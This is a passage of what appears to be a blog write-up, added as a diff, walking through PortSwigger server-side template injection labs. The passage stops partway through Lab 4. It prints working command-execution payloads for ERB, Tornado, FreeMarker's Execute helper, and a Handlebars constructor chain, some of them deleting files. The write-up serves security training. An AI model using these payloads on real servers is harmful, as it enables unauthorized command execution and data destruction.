@@ -1,0 +1,1066 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="icon" href="../favicon/favicon.ico">
+  <link rel="icon" type="image/svg+xml" href="../favicon/favicon.svg">
+  <link rel="apple-touch-icon" href="../favicon/apple-touch-icon.png">
+  <title>PortSwigger SSTI Labs 1-7 Write-Up, Engine Fingerprinting, Sandbox Escapes &amp; Object Abuse - Vali Hakuryuko</title>
+  <meta name="description" content="A detailed PortSwigger SSTI walkthrough covering ERB, Tornado, FreeMarker, Handlebars, Django, Twig, fingerprinting, documentation-led exploitation, sandbox bypasses, and object abuse." />
+  <meta property="og:title" content="PortSwigger SSTI Labs 1-7 Write-Up, Engine Fingerprinting, Sandbox Escapes &amp; Object Abuse - Vali Hakuryuko" />
+  <meta property="og:description" content="A lab-by-lab SSTI write-up with screenshots, payload reasoning, framework fingerprints, documentation pivots, and exploitation notes for each PortSwigger exercise." />
+  <meta property="og:type" content="article" />
+  <meta property="og:image" content="/image/SSTI/lab1-detection-intruder.png" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=Outfit:wght@300;400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="../style.css" />
+  <link rel="stylesheet" href="../post.css" />
+  <link rel="stylesheet" href="../interactive.css" />
+</head>
+<body class="post-page">
+  <nav>
+    <a href="../index.html" class="nav-logo"><span>~/</span>Vali</a>
+    <ul class="nav-links">
+      <li><a href="../index.html#about">About</a></li>
+      <li><a href="../blog.html">Blog</a></li>
+      <li><a href="../learning-path.html">Path</a></li>
+      <li><a href="../index.html#contact">Contact</a></li>
+    </ul>
+    <button class="theme-btn" onclick="toggleTheme()">[ theme ]</button>
+  </nav>
+  <div class="layout">
+    <header class="post-header header-with-particles" data-particle-scope data-particle-density="48" data-particle-link-distance="112">
+      <canvas class="site-particle-canvas post-particle-canvas" data-hero-particles aria-hidden="true"></canvas>
+      <div class="post-breadcrumb"><a href="../index.html">~</a> / <a href="../blog.html">blog</a> / ssti-labs</div>
+      <div class="post-meta-row">
+        <span class="post-date">2026-06-14</span>
+        <a href="../blog.html?tag=web" class="post-tag-link" aria-label="Browse Web posts"><span class="post-tag">Web</span></a><a href="../blog.html?tag=port-swigger" class="post-tag-link" aria-label="Browse Port Swigger posts"><span class="post-tag">Port Swigger</span></a><a href="../blog.html?tag=burp-suite" class="post-tag-link" aria-label="Browse Burp Suite posts"><span class="post-tag blue">Burp Suite</span></a><a href="../blog.html?tag=ssti" class="post-tag-link" aria-label="Browse SSTI posts"><span class="post-tag red">SSTI</span></a>
+        <span class="post-read-time">~58 min read</span>
+      </div>
+      <h1 class="post-title">PortSwigger SSTI Labs 1-7<br>Write-Up, Engine Fingerprinting &amp; Custom Exploit Paths</h1>
+      <p class="post-subtitle">A full SSTI walkthrough built around the exact solving path: syntax probes, stack-trace fingerprinting, documentation pivots, sandbox escapes, object abuse, and 22 screenshots from the steps that made each lab click.</p>
+    </header>
+
+    <section class="article-brief" aria-label="Article overview">
+      <div class="article-brief-grid">
+        <div class="article-brief-block">
+          <span class="article-brief-label">What This Covers</span>
+          <p>The full seven-lab PortSwigger SSTI path, from basic arithmetic probes to FreeMarker classloader abuse and a Twig-based custom exploit chain that turns avatar handling into an arbitrary file read.</p>
+        </div>
+        <div class="article-brief-block">
+          <span class="article-brief-label">Target / Labs</span>
+          <p>PortSwigger Web Security Academy server-side template injection labs</p>
+        </div>
+        <div class="article-brief-block">
+          <span class="article-brief-label">Tools Used</span>
+          <div class="article-tools"><span class="article-tool">Burp Suite</span><span class="article-tool">Intruder</span><span class="article-tool">Repeater</span><span class="article-tool">Template errors</span><span class="article-tool">Framework docs</span><span class="article-tool">Browser</span></div>
+        </div>
+        <div class="article-brief-block article-brief-wide">
+          <span class="article-brief-label">Key Takeaways</span>
+          <ul class="article-takeaways"><li>SSTI is usually won by identifying the engine first, not by guessing the final payload immediately.</li><li>Error messages, object graphs, helper utilities, and method signatures are often more valuable than a direct code-exec gadget.</li><li>Context matters: expression context, statement context, sandbox boundaries, and exposed objects all change what a valid exploit even looks like.</li></ul>
+        </div>
+      </div>
+    </section>
+
+    <style>
+    :root {
+      --post-width: 840px;
+      --post-subtitle-size: 1.05rem;
+    }
+
+    .track-strip {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 14px;
+      padding: 1.35rem 1.5rem;
+      margin-bottom: 2rem;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 1.4rem;
+      align-items: center;
+    }
+    .track-stat { display: flex; flex-direction: column; gap: 0.18rem; }
+    .track-label { font-family: var(--mono); font-size: 0.65rem; color: var(--text3); letter-spacing: 0.08em; text-transform: uppercase; }
+    .track-value { font-family: var(--display); font-size: 1.3rem; font-weight: 800; color: var(--accent); }
+    .track-divider { width: 1px; height: 38px; background: var(--border); }
+
+    .resource-links {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.85rem;
+      margin: 0 0 2.5rem;
+    }
+    .resource-link {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.45rem;
+      padding: 0.78rem 1rem;
+      border-radius: var(--radius);
+      border: 1px solid var(--border);
+      background: var(--surface);
+      font-family: var(--mono);
+      font-size: 0.74rem;
+      color: var(--text2);
+      transition: border-color var(--transition), transform var(--transition), color var(--transition);
+      text-decoration: none;
+    }
+    .resource-link:hover {
+      color: var(--accent);
+      border-color: var(--accent);
+      transform: translateY(-2px);
+      text-decoration: none;
+    }
+
+    .toc-note {
+      margin-bottom: 1.15rem;
+      color: var(--text3);
+      font-size: 0.93rem;
+      line-height: 1.7;
+    }
+
+    .framework-grid {
+      display: grid;
+      grid-template-columns: repeat(2, minmax(0, 1fr));
+      gap: 1rem;
+      margin: 0 0 2rem;
+    }
+    .framework-card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 1.15rem 1.2rem;
+    }
+    .framework-card-title {
+      font-family: var(--mono);
+      font-size: 0.72rem;
+      color: var(--accent);
+      margin-bottom: 0.45rem;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+    }
+    .framework-card p {
+      margin: 0;
+      font-size: 0.9rem;
+      color: var(--text2);
+      line-height: 1.65;
+    }
+
+    .lab-section { margin-bottom: 5rem; }
+    .lab-header {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 1.75rem 2rem;
+      margin-bottom: 2rem;
+      display: grid;
+      grid-template-columns: auto 1fr;
+      gap: 1.5rem;
+      align-items: start;
+    }
+    .lab-num {
+      font-family: var(--mono);
+      font-size: 0.7rem;
+      font-weight: 700;
+      color: #000;
+      background: var(--accent);
+      width: 40px;
+      height: 40px;
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      margin-top: 2px;
+    }
+    .lab-title-row { display: flex; align-items: center; gap: 0.75rem; margin-bottom: 0.4rem; flex-wrap: wrap; }
+    .lab-difficulty { font-family: var(--mono); font-size: 0.65rem; padding: 0.2rem 0.55rem; border-radius: 100px; border: 1px solid; }
+    .diff-apprentice { color: #5dffb2; border-color: #5dffb2; background: #0e2b1f; }
+    .diff-practitioner { color: #f5a623; border-color: #f5a623; background: #1e1800; }
+    .diff-hybrid { color: #c69bff; border-color: #c69bff; background: rgba(124, 92, 255, 0.14); }
+    h2.lab-title { font-family: var(--display); font-size: 1.32rem; font-weight: 700; letter-spacing: -0.02em; }
+    .lab-goal { font-family: var(--mono); font-size: 0.75rem; color: var(--text3); margin-top: 0.4rem; }
+    .lab-goal span { color: var(--accent); }
+
+    h3 {
+      font-family: var(--display);
+      font-size: 1.05rem;
+      font-weight: 700;
+      margin: 2rem 0 0.75rem;
+      color: var(--text);
+    }
+    p { color: var(--text2); font-size: 1rem; line-height: 1.85; margin-bottom: 1.1rem; }
+    p strong { color: var(--text); font-weight: 600; }
+    ul, ol { padding-left: 1.5rem; margin-bottom: 1.1rem; }
+    li { color: var(--text2); font-size: 1rem; line-height: 1.75; margin-bottom: 0.45rem; }
+    li strong { color: var(--text); }
+
+    .lab-key-grid,
+    .recap-grid {
+      display: grid;
+      grid-template-columns: repeat(2, minmax(0, 1fr));
+      gap: 1rem;
+      margin: 1.5rem 0;
+    }
+    .lab-key,
+    .recap-card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 1.15rem 1.2rem;
+    }
+    .lab-key-label,
+    .recap-title {
+      display: block;
+      font-family: var(--mono);
+      font-size: 0.7rem;
+      color: var(--accent);
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      margin-bottom: 0.45rem;
+    }
+    .lab-key p,
+    .recap-card p {
+      margin: 0;
+      font-size: 0.9rem;
+      line-height: 1.65;
+    }
+
+    code { font-family: var(--mono); font-size: 0.875em; background: var(--surface2); border: 1px solid var(--border); padding: 0.15em 0.4em; border-radius: 4px; color: var(--accent); }
+    pre { background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius); padding: 1.4rem; overflow-x: auto; margin: 1.4rem 0; }
+    pre code { background: none; border: none; padding: 0; color: var(--text); font-size: 0.85rem; line-height: 1.7; }
+
+    .workflow-card,
+    .payload-box,
+    .snapshot-card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 1.3rem 1.45rem;
+      margin: 1.35rem 0;
+    }
+    .workflow-title,
+    .payload-label,
+    .snapshot-label {
+      display: block;
+      font-family: var(--mono);
+      font-size: 0.68rem;
+      color: var(--accent);
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      margin-bottom: 0.75rem;
+    }
+    .payload-box pre,
+    .snapshot-card pre {
+      margin: 0;
+    }
+    .snapshot-card {
+      font-family: var(--mono);
+      font-size: 0.82rem;
+      line-height: 1.75;
+      overflow-x: auto;
+    }
+
+    .callout { border-radius: var(--radius); padding: 1.1rem 1.4rem; margin: 1.5rem 0; border-left: 3px solid; }
+    .callout-title { font-family: var(--mono); font-size: 0.7rem; text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 0.4rem; font-weight: 500; }
+    .callout p { margin: 0; font-size: 0.88rem; color: var(--text2); }
+    .callout.info { background: var(--accent3-dim); border-color: var(--accent3); }
+    .callout.info .callout-title { color: var(--accent3); }
+    .callout.warning { background: var(--accent4-dim); border-color: var(--accent4); }
+    .callout.warning .callout-title { color: var(--accent4); }
+    .callout.success { background: var(--accent-dim); border-color: var(--accent); }
+    .callout.success .callout-title { color: var(--accent); }
+    .callout.danger { background: var(--accent2-dim); border-color: var(--accent2); }
+    .callout.danger .callout-title { color: var(--accent2); }
+
+    .steps { display: flex; flex-direction: column; gap: 0; margin: 1.5rem 0; }
+    .step { display: flex; gap: 1.25rem; position: relative; }
+    .step:not(:last-child)::after { content: ""; position: absolute; left: 15px; top: 36px; bottom: -8px; width: 1px; background: var(--border); }
+    .step-num { width: 32px; height: 32px; border-radius: 50%; background: var(--surface2); border: 1px solid var(--border); font-family: var(--mono); font-size: 0.7rem; color: var(--accent); display: flex; align-items: center; justify-content: center; flex-shrink: 0; margin-top: 2px; }
+    .step-body { padding-bottom: 1.5rem; }
+    .step-title { font-family: var(--display); font-size: 0.96rem; font-weight: 700; color: var(--text); margin-bottom: 0.35rem; }
+    .step-body p { font-size: 0.92rem; margin-bottom: 0; }
+
+    .screenshot-wrap { margin: 1.75rem 0; }
+    .screenshot-wrap img { width: 100%; border-radius: var(--radius); border: 1px solid var(--border); display: block; cursor: zoom-in; transition: opacity 0.15s ease; }
+    .screenshot-wrap img:hover { opacity: 0.92; }
+    .screenshot-caption { font-family: var(--mono); font-size: 0.68rem; color: var(--text3); margin-top: 0.65rem; display: flex; align-items: center; gap: 0.5rem; line-height: 1.65; }
+    .screenshot-caption::before { content: "//"; font-size: 0.62rem; color: var(--accent); }
+    .screenshot-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; margin: 1.75rem 0; }
+    .screenshot-grid .screenshot-wrap { margin: 0; }
+
+    .lab-takeaway {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 1.45rem;
+      margin-top: 1.75rem;
+      display: grid;
+      grid-template-columns: auto 1fr;
+      gap: 1rem;
+      align-items: start;
+    }
+    .takeaway-icon { font-size: 1.15rem; }
+    .takeaway-title { font-family: var(--mono); font-size: 0.7rem; color: var(--accent); text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 0.35rem; }
+    .takeaway-text { font-size: 0.88rem; color: var(--text2); line-height: 1.6; }
+
+    .lab-divider { border: none; border-top: 1px solid var(--border); margin: 4rem 0; }
+
+    @media (max-width: 768px) {
+      .track-divider { display: none; }
+      .framework-grid,
+      .lab-key-grid,
+      .recap-grid,
+      .screenshot-grid { grid-template-columns: 1fr; }
+      .lab-header { grid-template-columns: 1fr; gap: 1rem; }
+    }
+    </style>
+
+    <div class="track-strip" aria-label="SSTI track snapshot">
+      <div class="track-stat">
+        <span class="track-label">Labs covered</span>
+        <span class="track-value">7</span>
+      </div>
+      <div class="track-divider"></div>
+      <div class="track-stat">
+        <span class="track-label">Screenshots included</span>
+        <span class="track-value">22</span>
+      </div>
+      <div class="track-divider"></div>
+      <div class="track-stat">
+        <span class="track-label">Frameworks touched</span>
+        <span class="track-value">ERB / Tornado / FreeMarker / Handlebars / Django / Twig</span>
+      </div>
+      <div class="track-divider"></div>
+      <div class="track-stat">
+        <span class="track-label">Theme</span>
+        <span class="track-value">Fingerprint first, exploit second</span>
+      </div>
+    </div>
+
+    <div class="resource-links">
+      <a href="jwt-labs.html" class="resource-link">adjacent -> JWT labs write-up</a>
+      <a href="sqli-labs.html" class="resource-link">adjacent -> SQLi labs write-up</a>
+      <a href="../blog.html?tag=port-swigger" class="resource-link">archive -> PortSwigger posts</a>
+    </div>
+
+    <div class="toc">
+      <div class="toc-title">// contents</div>
+      <p class="toc-note">This write-up is intentionally long. SSTI looks like "just another payload category" from far away, but in practice each lab becomes a framework-identification and object-model problem. The screenshots below are the exact checkpoints that made each jump reliable.</p>
+      <ol>
+        <li><a href="#overview">Why the SSTI track feels different</a></li>
+        <li><a href="#lab1">Lab 1 - ERB detection through the <code>message</code> parameter</a></li>
+        <li><a href="#lab2">Lab 2 - Tornado code-context breakout in comment author display</a></li>
+        <li><a href="#lab3">Lab 3 - FreeMarker documentation-led command execution</a></li>
+        <li><a href="#lab4">Lab 4 - Handlebars fingerprinting and documented gadget abuse</a></li>
+        <li><a href="#lab5">Lab 5 - Django sandbox disclosure with <code>{% debug %}</code></a></li>
+        <li><a href="#lab6">Lab 6 - FreeMarker object abuse to reach <code>Execute</code></a></li>
+        <li><a href="#lab7">Lab 7 - Twig custom exploit via avatar setter abuse</a></li>
+        <li><a href="#recap">Recap - The patterns that kept repeating</a></li>
+      </ol>
+    </div>
+
+    <article>
+      <div id="overview" class="framework-grid">
+        <div class="framework-card">
+          <div class="framework-card-title">Labs 1-2 // syntax and context</div>
+          <p>The early labs are not about "getting code exec fast". They are about recognizing whether your input lands as plain text, inside an existing expression, or in a statement-capable zone. The difference between <code>49</code> and <code>{{49}}</code> changes everything.</p>
+        </div>
+        <div class="framework-card">
+          <div class="framework-card-title">Labs 3-4 // documentation wins</div>
+          <p>Once the engine is identified, official docs and public exploit write-ups become part of the attack surface. FreeMarker's <code>Execute</code> utility and the Handlebars constructor chain both come from reading how the engine actually behaves.</p>
+        </div>
+        <div class="framework-card">
+          <div class="framework-card-title">Labs 5-6 // sandboxes are still data sources</div>
+          <p>Even when a template language blocks the easy path to code execution, it may still expose configuration, object metadata, or Java internals that collapse the lab in a different way.</p>
+        </div>
+        <div class="framework-card">
+          <div class="framework-card-title">Lab 7 // custom exploit mindset</div>
+          <p>The last lab matters because there is no single copy-paste finish. You collect clues from upload behavior, method signatures, and read side-effects, then build a chain the application accidentally gives you.</p>
+        </div>
+      </div>
+
+      <div class="callout info">
+        <div class="callout-title">Working method</div>
+        <p>My solving rhythm across the whole track was consistent: start with arithmetic probes, treat every verbose error like a fingerprint, map the object model before chasing RCE, and only use the destructive or final-read payload once the path is already proven.</p>
+      </div>
+
+      <div class="lab-section" id="lab1">
+        <div class="lab-header">
+          <div class="lab-num">01</div>
+          <div>
+            <div class="lab-title-row">
+              <span class="lab-difficulty diff-apprentice">Apprentice</span>
+            </div>
+            <h2 class="lab-title">ERB message injection: use Intruder to identify the delimiter, then pivot to shell backticks</h2>
+            <div class="lab-goal">Goal: <span>Confirm server-side evaluation in the <code>message</code> parameter, identify the engine, and remove <code>morale.txt</code>.</span></div>
+          </div>
+        </div>
+
+        <div class="lab-key-grid">
+          <div class="lab-key">
+            <span class="lab-key-label">Injection surface</span>
+            <p>The out-of-stock notice reflects a <code>message</code> query parameter back into the rendered page.</p>
+          </div>
+          <div class="lab-key">
+            <span class="lab-key-label">Winning clue</span>
+            <p><code>&lt;%= 7 * 7 %&gt;</code> renders <code>49</code>, which is a strong Ruby ERB signal.</p>
+          </div>
+          <div class="lab-key">
+            <span class="lab-key-label">Execution primitive</span>
+            <p>Ruby backticks execute a shell command and interpolate the output into the template result.</p>
+          </div>
+          <div class="lab-key">
+            <span class="lab-key-label">Finish</span>
+            <p>Swap the arithmetic probe for <code>rm morale.txt</code> once the ERB evaluation path is already proven.</p>
+          </div>
+        </div>
+
+        <p>
+          This first lab is the cleanest example of why SSTI detection should start broad. I did not begin with a framework assumption. I started with a payload set that mixed different syntaxes, pushed them through Intruder, and watched for a response delta that looked like real server-side evaluation instead of harmless reflection.
+        </p>
+        <p>
+          The important part is not just that <code>49</code> appeared. It is that the rest of the response remained stable enough to treat the result as an evaluated expression inside the template rather than a parser crash. That turns the problem from "is this injectable?" into "which runtime rules am I standing inside?"
+        </p>
+
+        <div class="workflow-card">
+          <span class="workflow-title">Burp sequence</span>
+          <ol>
+            <li>Send the request with the reflected <code>message</code> parameter to Intruder.</li>
+            <li>Use a small cross-engine wordlist containing arithmetic and object-access probes.</li>
+            <li>Sort by response length and inspect any candidates that create a visible number or framework-specific error.</li>
+            <li>Once <code>&lt;%= 7 * 7 %&gt;</code> returns <code>49</code>, move back to Repeater and keep the payload family consistent.</li>
+          </ol>
+        </div>
+
+        <div class="screenshot-grid">
+          <figure class="screenshot-wrap">
+            <img src="../image/SSTI/lab1-detection-intruder.png" alt="Burp Intruder attack against the message parameter showing multiple template probes and the ERB arithmetic payload returning 49." loading="lazy" />
+            <figcaption class="screenshot-caption">Intruder narrows the field: several probes change the response, but <code>&lt;%= 7 * 7 %&gt;</code> cleanly produces <code>49</code>, which is the fingerprint that matters.</figcaption>
+          </figure>
+          <figure class="screenshot-wrap">
+            <img src="../image/SSTI/lab1-erb-rce-payload.png" alt="Burp Repeater request with a URL-encoded ERB payload that runs rm morale.txt and a response showing the page still renders." loading="lazy" />
+            <figcaption class="screenshot-caption">Once ERB is confirmed, the URL-encoded backtick payload <code>&lt;%= `rm morale.txt` %&gt;</code> becomes enough to solve the lab without needing any extra gadget.</figcaption>
+          </figure>
+        </div>
+
+        <h3>Why the final payload works</h3>
+        <p>
+          In ERB, <code>&lt;%= ... %&gt;</code> evaluates Ruby and prints the return value into the template. Backticks inside Ruby spawn a shell command and return the command's stdout. For <code>7 * 7</code>, that return value is <code>49</code>. For <code>rm morale.txt</code>, there is no meaningful stdout, so the page still renders but the side effect happens server-side.
+        </p>
+
+        <div class="payload-box">
+          <span class="payload-label">Final payload</span>
+          <pre><code>&lt;%= `rm morale.txt` %&gt;</code></pre>
+        </div>
+
+        <div class="lab-takeaway">
+          <div class="takeaway-icon">01</div>
+          <div>
+            <div class="takeaway-title">Takeaway</div>
+            <div class="takeaway-text">The first win in SSTI is not RCE. It is delimiter certainty. Once the engine syntax is real and repeatable, the payload space becomes much smaller and much more reliable.</div>
+          </div>
+        </div>
+      </div>
+
+      <hr class="lab-divider">
+
+      <div class="lab-section" id="lab2">
+        <div class="lab-header">
+          <div class="lab-num">02</div>
+          <div>
+            <div class="lab-title-row">
+              <span class="lab-difficulty diff-apprentice">Apprentice</span>
+            </div>
+            <h2 class="lab-title">Tornado code-context escape: break out of the surrounding expression before importing <code>os</code></h2>
+            <div class="lab-goal">Goal: <span>Turn a code-context injection in <code>blog-post-author-display</code> into command execution and remove <code>morale.txt</code>.</span></div>
+          </div>
+        </div>
+
+        <div class="lab-key-grid">
+          <div class="lab-key">
+            <span class="lab-key-label">Injection surface</span>
+            <p>The author-display setting for blog comments is rendered server-side and then reflected back on the post page.</p>
+          </div>
+          <div class="lab-key">
+            <span class="lab-key-label">Winning clue</span>
+            <p><code>{{7*7}}</code> does evaluate, but the page prints <code>{{49}}</code>, which means the payload is landing inside existing template syntax rather than as a fresh standalone block.</p>
+          </div>
+          <div class="lab-key">
+            <span class="lab-key-label">Execution primitive</span>
+            <p>Close the current expression with <code>}}</code>, inject a Tornado statement tag, then execute <code>os.system()</code>.</p>
+          </div>
+          <div class="lab-key">
+            <span class="lab-key-label">Why the <code>0</code> matters</span>
+            <p><code>os.system()</code> returns an integer status code. Seeing <code>0</code> in the rendered name is proof that the command ran successfully.</p>
+          </div>
+        </div>
+
+        <p>
+          This lab is valuable because it teaches the difference between "template syntax works" and "my input is the whole template expression". The <code>{{49}}</code> output is not a failure. It is the exact clue that says the application is wrapping your input with its own braces or placing it inside an existing expression slot.
+        </p>
+        <p>
+          Once you notice that, the right move is to stop trying bigger arithmetic probes and instead escape the current context cleanly. That is why the payload begins with <code>user.name}}</code>: the first job is to end the expression the application already started for you.
+        </p>
+
+        <div class="steps">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-body">
+              <div class="step-title">Prove evaluation is happening</div>
+              <p>The arithmetic payload shows up as <code>{{49}}</code>. That tells us the engine is evaluating the inner math but we are still nested inside surrounding template markup.</p>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-body">
+              <div class="step-title">Break out and validate command execution</div>
+              <p>Inject <code>{% import os %}</code> and call <code>{{os.system('whoami')}}</code>. The rendered author string now includes the original user name plus an exit code, proving that the statement executed.</p>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-body">
+              <div class="step-title">Swap the command for the lab action</div>
+              <p>Replace <code>whoami</code> with <code>rm morale.txt</code> and resend. The redirect behavior stays the same because the endpoint still behaves like a settings update.</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="screenshot-wrap">
+          <img src="../image/SSTI/lab2-code-context-arithmetic.png" alt="Burp Repeater request showing the blog-post-author-display parameter set to {{7*7}} and the rendered comment author appearing as {{49}}." loading="lazy" />
+          <figcaption class="screenshot-caption">The weird-but-perfect clue: the page prints <code>{{49}}</code>, not just <code>49</code>. That is the sign that the payload is executing inside an already-open template expression.</figcaption>
+        </div>
+
+        <div class="screenshot-grid">
+          <figure class="screenshot-wrap">
+            <img src="../image/SSTI/lab2-tornado-rce-payload.png" alt="Burp Repeater request using user.name}}{% import os %}{{os.system('whoami')}} and the page showing the modified author name with a successful exit code." loading="lazy" />
+            <figcaption class="screenshot-caption">Breaking out with <code>user.name}}</code> and importing <code>os</code> proves real execution. The trailing <code>0</code> comes from <code>os.system()</code> returning a successful exit code.</figcaption>
+          </figure>
+          <figure class="screenshot-wrap">
+            <img src="../image/SSTI/lab2-solved.png" alt="Burp Repeater request using the Tornado payload to run rm morale.txt and the browser showing the lab solved banner." loading="lazy" />
+            <figcaption class="screenshot-caption">Same structure, different command: after <code>whoami</code> works, switching to <code>rm morale.txt</code> is enough to finish the lab.</figcaption>
+          </figure>
+        </div>
+
+        <div class="payload-box">
+          <span class="payload-label">Validation payload</span>
+          <pre><code>user.name}}{% import os %}{{os.system('whoami')}}</code></pre>
+        </div>
+
+        <div class="payload-box">
+          <span class="payload-label">Final payload</span>
+          <pre><code>user.name}}{% import os %}{{os.system('rm morale.txt')}}</code></pre>
+        </div>
+
+        <div class="callout info">
+          <div class="callout-title">Why the output looks messy</div>
+          <p>The response is doing exactly what the template tells it to do: render the existing <code>user.name</code>, then your injected statement and expression, then whatever closing braces remain from the surrounding template. Messy output is still useful output.</p>
+        </div>
+
+        <div class="lab-takeaway">
+          <div class="takeaway-icon">02</div>
+          <div>
+            <div class="takeaway-title">Takeaway</div>
+            <div class="takeaway-text">Code context is its own problem. If the app already owns part of the template syntax around your input, the real exploit begins with escaping that structure cleanly, not with throwing larger payloads at it.</div>
+          </div>
+        </div>
+      </div>
+
+      <hr class="lab-divider">
+
+      <div class="lab-section" id="lab3">
+        <div class="lab-header">
+          <div class="lab-num">03</div>
+          <div>
+            <div class="lab-title-row">
+              <span class="lab-difficulty diff-practitioner">Practitioner</span>
+            </div>
+            <h2 class="lab-title">FreeMarker documentation path: trigger a template error, find <code>Execute</code>, then use it deliberately</h2>
+            <div class="lab-goal">Goal: <span>Identify the template engine from its error page, validate the FreeMarker helper surface, and remove <code>morale.txt</code>.</span></div>
+          </div>
+        </div>
+
+        <p>
+          This is the first lab where the framework tells on itself loudly enough that documentation becomes the main exploit path. An undefined variable reference in the template editor produces a full FreeMarker error page, including naming, formatting, and tips that are specific enough to eliminate most of the search space immediately.
+        </p>
+        <p>
+          After that, the solve is less about creativity and more about discipline: prove that the helper is available with a harmless command first, then switch to the destructive lab action once you know the primitive is real.
+        </p>
+
+        <div class="screenshot-grid">
+          <figure class="screenshot-wrap">
+            <img src="../image/SSTI/lab3-freemarker-error-fingerprint.png" alt="Template editor showing ${grnsjV.stock} and the resulting FreeMarker template error page." loading="lazy" />
+            <figcaption class="screenshot-caption">The undefined-variable error is the fingerprint. The page explicitly says <code>FreeMarker template error</code>, so there is no reason to keep guessing engine syntax after this point.</figcaption>
+          </figure>
+          <figure class="screenshot-wrap">
+            <img src="../image/SSTI/lab3-execute-ls.png" alt="Template editor using FreeMarker Execute to run ls and the preview output showing morale.txt in the response." loading="lazy" />
+            <figcaption class="screenshot-caption">Before using a destructive command, I validate the primitive with <code>ls</code>. Seeing <code>morale.txt</code> echoed inline proves that <code>Execute</code> is available and command execution is already solved.</figcaption>
+          </figure>
+        </div>
+
+        <div class="payload-box">
+          <span class="payload-label">Engine fingerprint</span>
+          <pre><code>${grnsjV.stock} left of ${product.name} at ${product.price}.&lt;/p&gt;</code></pre>
+        </div>
+
+        <div class="payload-box">
+          <span class="payload-label">Safe proof of execution</span>
+          <pre><code>${"freemarker.template.utility.Execute"?new()("ls")} left of ${product.name} at ${product.price}.&lt;/p&gt;</code></pre>
+        </div>
+
+        <div class="screenshot-wrap">
+          <img src="../image/SSTI/lab3-solved.png" alt="Solved lab banner after replacing the FreeMarker ls proof with rm morale.txt." loading="lazy" />
+          <figcaption class="screenshot-caption">Once the harmless <code>ls</code> proof works, the final solve is just a command swap: <code>rm morale.txt</code> instead of enumeration.</figcaption>
+        </div>
+
+        <div class="payload-box">
+          <span class="payload-label">Final payload</span>
+          <pre><code>${"freemarker.template.utility.Execute"?new()("rm morale.txt")} left of ${product.name} at ${product.price}.&lt;/p&gt;</code></pre>
+        </div>
+
+        <div class="callout warning">
+          <div class="callout-title">Why this lab matters</div>
+          <p>The vulnerability is not just "FreeMarker exists". The vulnerability is that a dangerous helper object is reachable from user-controlled template content. Documentation is powerful here because the product already shipped the primitive for you.</p>
+        </div>
+
+        <div class="lab-takeaway">
+          <div class="takeaway-icon">03</div>
+          <div>
+            <div class="takeaway-title">Takeaway</div>
+            <div class="takeaway-text">Verbose errors are not noise. In SSTI they often collapse the hardest part of the problem by naming the engine, hinting at the syntax, and telling you exactly which documentation set to open in your head.</div>
+          </div>
+        </div>
+      </div>
+
+      <hr class="lab-divider">
+
+      <div class="lab-section" id="lab4">
+        <div class="lab-header">
+          <div class="lab-num">04</div>
+          <div>
+            <div class="lab-title-row">
+              <span class="lab-difficulty diff-practitioner">Practitioner</span>
+            </div>
+            <h2 class="lab-title">Unknown engine to Handlebars exploit: use stack traces as the fingerprint, then restore access to JavaScript's constructor</h2>
+            <div class="lab-goal">Goal: <span>Identify the unknown engine, adapt a documented Handlebars gadget chain, and delete <code>/home/carlos/morale.txt</code>.</span></div>
+          </div>
+        </div>
+
+        <p>
+          This lab starts exactly where a lot of real SSTI work starts: the syntax is unknown, the payloads are noisy, and the easy probes mostly trigger failures. That is not a dead end. In template injection, a failure that carries a stack trace is often better than a successful reflection.
+        </p>
+        <p>
+          Here, Intruder gave me the signal I needed. The response stack trace exposed <code>Handlebars</code> directly. Once that was visible, the problem changed from raw discovery to adapting a known exploitation pattern that regains access to JavaScript's <code>Function</code> constructor and from there to <code>child_process.exec()</code>.
+        </p>
+
+        <div class="screenshot-wrap">
+          <img src="../image/SSTI/lab4-handlebars-fingerprint.png" alt="Burp Intruder results showing multiple payloads and a response stack trace that highlights Handlebars." loading="lazy" />
+          <figcaption class="screenshot-caption">The unknown engine stops being unknown the moment the stack trace names <code>Handlebars</code>. That one line is more valuable than a hundred blind payload guesses.</figcaption>
+        </div>
+
+        <div class="payload-box">
+          <span class="payload-label">Documentation-style validation payload</span>
+          <pre><code>{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').exec('whoami');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
